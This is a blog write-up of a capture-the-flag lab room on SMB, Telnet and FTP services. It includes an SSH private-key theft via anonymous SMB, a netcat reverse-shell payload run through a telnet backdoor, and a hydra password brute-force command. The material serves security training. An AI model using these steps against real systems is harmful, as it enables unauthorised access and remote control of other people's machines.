<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Write-Up [THM] Network Services | Cyber TryHard</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Write-Up [THM] Network Services" /><meta name="author" content="Juliette" /><meta property="og:locale" content="en_US" /><meta name="description" content="It’s a write-up about the room : Try Hack Me - Room : Network Services" /><meta property="og:description" content="It’s a write-up about the room : Try Hack Me - Room : Network Services" /><link rel="canonical" href="https://juliette1012.github.io/posts/THM-Network-Services/" /><meta property="og:url" content="https://juliette1012.github.io/posts/THM-Network-Services/" /><meta property="og:site_name" content="Cyber TryHard" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-31T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Write-Up [THM] Network Services" /><meta name="twitter:site" content="@CyberTryHard" /><meta name="twitter:creator" content="@Juliette" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"It’s a write-up about the room : Try Hack Me - Room : Network Services","@type":"BlogPosting","headline":"Write-Up [THM] Network Services","dateModified":"2020-08-31T00:00:00+02:00","datePublished":"2020-08-31T00:00:00+02:00","url":"https://juliette1012.github.io/posts/THM-Network-Services/","mainEntityOfPage":{"@type":"WebPage","@id":"https://juliette1012.github.io/posts/THM-Network-Services/"},"author":{"@type":"Person","name":"Juliette"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/mstile-150x150.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/try-hard.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Cyber TryHard</a></div><div class="site-subtitle font-italic">Blog post for my personal works and discoveries.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/Juliette1012" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/CyberTryHard" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['juju10.grosset','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Write-Up [THM] Network Services</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Write-Up [THM] Network Services</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Aug 31, 2020, 12:00 AM +0200" > Aug 31 <i class="unloaded">2020-08-31T00:00:00+02:00</i> </span> by <span class="author"> Juliette </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Dec 4, 2020, 12:38 PM +0100" > Dec 4 <i class="unloaded">2020-12-04T12:38:33+01:00</i> </span></div></div><div class="post-content"> <img class="feat-img" src="/assets/img/thm/network-services/theme.png" alt="Network Services" /><p>It’s a write-up about the room : <a href="https://tryhackme.com/room/networkservices">Try Hack Me - Room : Network Services</a></p><h1 id="task-1-get-connected">[Task 1] Get Connected</h1><blockquote><p>This room will explore common Network Service vulnerabilities and misconfigurations.</p></blockquote><h1 id="task-2---understanding-smb">[Task 2] - Understanding SMB</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-1.png" alt="Task 1" /></p><ul><li><p>What does SMB stand for? <code class="language-plaintext highlighter-rouge">Server Message Block</code></p></li><li><p>What type of protocol is SMB? <code class="language-plaintext highlighter-rouge">response-request</code></p></li><li><p>What do clients connect to servers using? <code class="language-plaintext highlighter-rouge">tcp/ip</code></p></li><li><p>What systems does Samba run on? <code class="language-plaintext highlighter-rouge">Unix</code></p></li></ul><h1 id="task-3---enumerating-smb">[Task 3] - Enumerating SMB</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-3.png" alt="Task 3" /></p><p>We scan all ports using <code class="language-plaintext highlighter-rouge">sudo nmap -sV -sC ip_machine</code></p><ul><li><p>Conduct an nmap scan of your choosing, How many ports are open? <code class="language-plaintext highlighter-rouge">3</code></p></li><li><p>What ports is SMB running on? <code class="language-plaintext highlighter-rouge">139/445</code></p></li><li><p>Let’s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? <code class="language-plaintext highlighter-rouge">WORKGROUP</code></p></li><li><p>Let’s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? <code class="language-plaintext highlighter-rouge">polosmb</code></p></li><li><p>What operating system version is running? <code class="language-plaintext highlighter-rouge">6.1</code></p></li><li><p>What share sticks out as something we might want to investigate? <code class="language-plaintext highlighter-rouge">profiles</code></p></li></ul><h1 id="task-4---exploiting-smb">[Task 4] - Exploiting SMB</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-4.png" alt="Task 4" /></p><ul><li>What would be the correct syntax to access an SMB share called “secret” as user “suit” on a machine with the IP 10.10.10.2 on the default port?</li></ul><p>We find that default SMB port are 139 and 445 by googling. <br /> So, the correct syntax to access is : <code class="language-plaintext highlighter-rouge">smbclient //10.10.10.2/secret -U suit -p 139</code></p><ul><li><p>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn’t require authentication to view the files. We can do this easily by:</p></li><li><p>using the username “Anonymous”</p></li><li><p>connecting to the share we found during the enumeration stage</p></li><li><p>and not supplying a password.</p></li></ul><p>Does the share allow anonymous access? Y/N? <code class="language-plaintext highlighter-rouge">Y</code></p><p>We use : <code class="language-plaintext highlighter-rouge">smbclient //10.10.244.174/profiles -U Anonymous -p 139</code></p><ul><li>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</li></ul><p><code class="language-plaintext highlighter-rouge">get "Working From Home Information.txt"</code> This file is a copy of an e-mail adressed to <strong>John Cactus</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>John Cactus

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever possible, employees should work from home. As such- your account has now been enabled with ssh access to the main server. 

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards, 

James
Department Manager
</pre></table></code></div></div><ul><li>What service has been configured to allow him to work from home? <code class="language-plaintext highlighter-rouge">ssh</code></li></ul><p>We use <code class="language-plaintext highlighter-rouge">ls</code> and find the directory <strong>.ssh</strong>.</p><ul><li>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</li></ul><p>We use <code class="language-plaintext highlighter-rouge">ls</code> to see the differents files :</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>id_rsa
id_rsa.pub
authorized_keys
</pre></table></code></div></div><p>The most useful key for us is <strong>id_rsa</strong>.</p><ul><li>Download this file to your local machine, and change the permissions to “600” using “chmod 600 [file]”. Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag?</li></ul><p>So, we get it <code class="language-plaintext highlighter-rouge">get id_rsa</code>. We change the permission of the file <code class="language-plaintext highlighter-rouge">chmod 600</code>.<br /> After that, we connect with ssh : <code class="language-plaintext highlighter-rouge">ssh -i id_rsa cactus@ip_machine</code>.</p><p>We use <code class="language-plaintext highlighter-rouge">ls</code>. There is the file <code class="language-plaintext highlighter-rouge">smb.txt</code>, so : <code class="language-plaintext highlighter-rouge">cat smb.txt</code>. <br /> The flag is <code class="language-plaintext highlighter-rouge">THM{smb_is_fun_eh?}</code>.</p><h1 id="task-5---understanding-telnet">[Task 5] - Understanding Telnet</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-5.png" alt="Task 5" /></p><ul><li><p>What is Telnet? <code class="language-plaintext highlighter-rouge">application protocol</code></p></li><li><p>What has slowly replaced Telnet? <code class="language-plaintext highlighter-rouge">ssh</code></p></li><li><p>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? <code class="language-plaintext highlighter-rouge">telnet 10.10.10.3 23</code></p></li><li><p>The lack of what, means that all Telnet communication is in plaintext? <code class="language-plaintext highlighter-rouge">encryption</code></p></li></ul><h1 id="task-6---enumerating-telnet">[Task 6] - Enumerating Telnet</h1><blockquote><p>We’ve already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don’t always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method.</p></blockquote><blockquote><p>Let’s start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap and the tag -A and -p-.</p></blockquote><p>We deploy the instance.</p><ul><li>How many ports are open on the target machine?</li></ul><p>We use nmap : <code class="language-plaintext highlighter-rouge">nmap -A -p- ip_machine</code> and find <code class="language-plaintext highlighter-rouge">1</code> port opened.</p><ul><li><p>What port is this ? <code class="language-plaintext highlighter-rouge">8012</code></p></li><li><p>This port is unassigned, but still lists the protocol it’s using, what protocol is this? <code class="language-plaintext highlighter-rouge">tcp</code></p></li><li><p>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</p></li></ul><p>We use : <code class="language-plaintext highlighter-rouge">nmap -A ip_machine</code> and find <code class="language-plaintext highlighter-rouge">0</code> port opened.</p><ul><li><p>Based on the title returned to us, what do we think this port could be used for? <code class="language-plaintext highlighter-rouge">a backdoor</code></p></li><li><p>Who could it belong to? Gathering possible usernames is an important step in enumeration. <code class="language-plaintext highlighter-rouge">skidy</code></p></li></ul><h1 id="task-7---exploiting-telnet">[Task 7] - Exploiting Telnet</h1><blockquote><p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-7.png" alt="Task 7" /></p><ul><li><p>Great! It’s an open telnet connection! What welcome message do we receive? <code class="language-plaintext highlighter-rouge">Skidy's backdoor</code></p></li><li><p>Let’s try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) <code class="language-plaintext highlighter-rouge">N</code></p></li><li><p>Now, use the command “ping [local tun0 ip] -c 1” through the telnet session to see if we’re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) <code class="language-plaintext highlighter-rouge">Y</code></p></li><li><p>We’re going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here’s our syntax: <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</code></p></li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format
</pre></table></code></div></div><p>What word does the generated payload start with?</p><p>We use : <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=local lport=4444 R</code>.<br /> The output is : <code class="language-plaintext highlighter-rouge">mkfifo /tmp/jwgd; nc 10.10.54.200 4444 0&lt;/tmp/jwgd | /bin/sh &gt;/tmp/jwgd 2&gt;&amp;1; rm /tmp/jwgd</code>.<br /> local is the local ip not the ip machine.</p><p>Therefore, the generated payload start with <code class="language-plaintext highlighter-rouge">mkfifo</code>.</p><ul><li>Perfect. We’re nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:</li></ul><p><code class="language-plaintext highlighter-rouge">nc -lvp [listening port]</code></p><p>What would the command look like for the listening port we selected in our payload? <code class="language-plaintext highlighter-rouge">nc -lvp 4444</code></p><ul><li>Success! What is the contents of flag.txt?</li></ul><p>We use <code class="language-plaintext highlighter-rouge">nc -lvp 444</code> on one terminal. In an other we connecte with telnet : <code class="language-plaintext highlighter-rouge">telnet ip_machine 8012</code> and run the payload : <code class="language-plaintext highlighter-rouge">.RUN mkfifo ...</code>. <br /> On the terminal with netcat we can use the shell, so <code class="language-plaintext highlighter-rouge">ls</code> and find a <code class="language-plaintext highlighter-rouge">flag.txt</code> file.<br /> We read it and the content is <code class="language-plaintext highlighter-rouge">THM{y0u_g0t_th3_t3ln3t_fl4g}</code>.</p><h1 id="task-8---understanding-ftp">[Task 8] - Understanding FTP</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-8.png" alt="Task 8" /></p><ul><li><p>What communications model does FTP use? <code class="language-plaintext highlighter-rouge">client-server</code></p></li><li><p>What’s the standard FTP port? <code class="language-plaintext highlighter-rouge">21</code></p></li><li><p>How many modes of FTP connection are there? <code class="language-plaintext highlighter-rouge">2</code></p></li></ul><h1 id="task-9---enumerating-ftp">[Task 9] - Enumerating FTP</h1><blockquote><p>We’re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.</p></blockquote><ul><li>Run an nmap scan of your choice. How many ports are open on the target machine?</li></ul><p>We use <code class="language-plaintext highlighter-rouge">nmap -A -sV -p- ip_machine</code> and find <code class="language-plaintext highlighter-rouge">2</code> ports opened.</p><ul><li>What port is ftp running on?</li></ul><p>We have :</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24 11:16 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.87.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
</pre></table></code></div></div><p>FTp was running on port <code class="language-plaintext highlighter-rouge">21</code>.</p><ul><li><p>What variant of FTP is running on it? <code class="language-plaintext highlighter-rouge">vsFTPd</code></p></li><li><p>Great, now we know what type of FTP server we’re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing “ftp [IP]” into the console, and entering “anonymous”, and no password when prompted.</p></li></ul><p>What is the name of the file in the anonymous FTP directory?</p><p>We use <code class="language-plaintext highlighter-rouge">ftp ip_machine</code> with the login <code class="language-plaintext highlighter-rouge">anonymous</code>.<br /> After that, we use the command <code class="language-plaintext highlighter-rouge">ls</code> and find the file <strong>PUBLIC_NOTICE.txt</strong>.</p><ul><li>What do we think a possible username could be?</li></ul><p>We get the file with <code class="language-plaintext highlighter-rouge">get PUBLIC_NOTICE.txt</code> and read it with <code class="language-plaintext highlighter-rouge">cat</code> : <code class="language-plaintext highlighter-rouge">cat PUBLIC_NOTICE.txt</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
</pre></table></code></div></div><p>A possible username can be <code class="language-plaintext highlighter-rouge">Mike</code>.</p><h1 id="task-10---exploiting-ftp">[Task 10] - Exploiting FTP</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/thm/network-services/task-10.png" alt="Task 10" /></p><ul><li>What is the password for the user “mike”?</li></ul><p>We use hydra : <code class="language-plaintext highlighter-rouge">hydra -t 4 -l mike -P rockyou.txt -vV ip_machine ftp</code> and find the password : <strong>password</strong>.</p><ul><li>What is ftp.txt?</li></ul><p>We connecte with ftp : <code class="language-plaintext highlighter-rouge">ftp ip_machine</code> with the login <code class="language-plaintext highlighter-rouge">mike</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.<br /> We use <code class="language-plaintext highlighter-rouge">ls</code> and find the file <code class="language-plaintext highlighter-rouge">ftp.txt</code>. We get it with <code class="language-plaintext highlighter-rouge">get ftp.txt</code>. We read it with the command <code class="language-plaintext highlighter-rouge">cat ftp.txt</code>.<br /> The flag is <code class="language-plaintext highlighter-rouge">THM{y0u_g0t_th3_ftp_fl4g}</code>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/write-ups/">Write-Ups</a>, <a href="/categories/tryhackme/">TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="/tags/networking/" class="post-tag no-text-decoration" >Networking</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >SMB</a> <a href="/tags/telnet/" class="post-tag no-text-decoration" >Telnet</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >FTP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Write-Up [THM] Network Services - Cyber TryHard&url=https://Juliette1012.github.io/posts/THM-Network-Services/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Write-Up [THM] Network Services - Cyber TryHard&u=https://Juliette1012.github.io/posts/THM-Network-Services/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Write-Up [THM] Network Services - Cyber TryHard&url=https://Juliette1012.github.io/posts/THM-Network-Services/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/THM-tmux/">Write-Up [THM] tmux</a></li><li><a href="/posts/THM-WebAppSec101/">Write-Up [THM] WebAppSec 101</a></li><li><a href="/posts/THM-Web-Scanning/">Write-Up [THM] Web Scanning</a></li><li><a href="/posts/THM-Web-Fundamentals/">Write-Up [THM] Web Fundamentals</a></li><li><a href="/posts/THM-ToolsRus/">Write-Up [THM] ToolsRus</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/red-primer-series/">Red Primer Series</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/bash/">Bash</a> <a class="post-tag" href="/tags/security/">Security</a> <a class="post-tag" href="/tags/scanning/">Scanning</a> <a class="post-tag" href="/tags/jail-escaping/">Jail Escaping</a> <a class="post-tag" href="/tags/adventofcyber2/">AdventOfCyber2</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/THM-Introductory-Networking/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 31 <i 